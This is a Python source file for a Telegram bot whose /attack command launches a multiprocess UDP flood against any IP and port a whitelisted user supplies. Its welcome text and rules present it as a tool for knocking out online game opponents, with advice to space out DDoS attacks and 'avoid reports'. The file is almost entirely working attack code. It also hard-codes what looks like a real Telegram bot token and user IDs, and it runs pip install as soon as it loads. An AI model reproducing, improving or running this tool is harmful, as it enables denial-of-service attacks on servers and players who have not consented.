import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging

# 🎛️ Function to install required packages
def install_requirements():
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '7119517186:AAGkpy6jd4_06kwIw7kzoF393iz-PLeFjLo'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [6034827272, 709106377]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(1028, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port):
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 500 CPU threads for maximum performance
    for _ in range(min(500, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    bot.send_message(user_id, f"☢️Launching an attack on {target_ip}:{target_port} 💀")

# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()  # 🛑 Stop the attack

        # 🕒 Wait for all processes to finish
        for process in processes:
            process.join()

        del user_attacks[user_id]
        bot.send_message(user_id, "🔴 All Attack stopped.")
    else:
        bot.send_message(user_id, "❌ No active attack found >ᴗ<")

# 🕰️ Function to calculate bot uptime
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
    else:
        welcome_message = (
            "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
            "Use /attack `<IP>:<port>` to start an attack, or /stop to halt your attack.\n\n"
            "📜 **Bot Rules - Keep It Cool!** 🌟\n"
            "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
            "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
            "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
            "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
            "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
            "6. Report issues! 🛡️ Message the owner for any problems.\n"
            "7. Always check your command before executing! ✅\n"
            "8. Do not attack without permission! ❌⚠️\n"
            "9. Be aware of the consequences of your actions! ⚖️\n"
            "10. Stay within the limits and play fair! 🤗\n"
            "💡 Follow the rules and let's enjoy gaming together! 🎉\n"
            "📞 Contact the owner on Instagram and Telegram: @all4outgaming1\n"
            "☠️ To see the Telegram Bot Command type: /help"
            "👤 To find your user ID type: /id"
        )
        bot.send_message(message.chat.id, welcome_message)

# 💬 Command handler for /attack
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
        return

    # Parse target IP and port from the command
    try:
        command = message.text.split()
        target = command[1].split(':')
        target_ip = target[0]
        target_port = int(target[1])
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")

# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
        return

    stop_attack(user_id)

# 💬 Command handler for /id
@bot.message_handler(commands=['id'])
def show_id(message):
    user_id = message.from_user.id
    log_command(user_id, '/id')
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}")

# 💬 Command handler for /rules
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @all4outgaming1")

# 💬 Command handler for /uptime
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping
@bot.message_handler(commands=['ping'])
def ping(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    # Measure ping time
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds
        bot.send_message(message.chat.id, f"🛰️🌐 Ping: {ping_time:.2f} ms")
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

# 💬 Command handler for /help
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🆘 **Available Commands:**\n"
        "/start - Start the bot\n"
        "/attack `<IP>:<port>` - Start an attack\n"
        "/stop - Stop the attack\n"
        "/id - Show your user ID\n"
        "/rules - View the bot rules\n"
        "/owner - Contact the owner\n"
        "/uptime - Get bot uptime\n"
        "/ping - Check your connection ping\n"
        "/help - Show this help message"
    )
    bot.send_message(message.chat.id, help_message)

# 🎮 Run the bot
if __name__ == "__main__":
    print(" 🪄 ☢️ Starting the Telegram bot...")  # Print statement for bot starting
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        time.sleep(15)  # Wait before restarting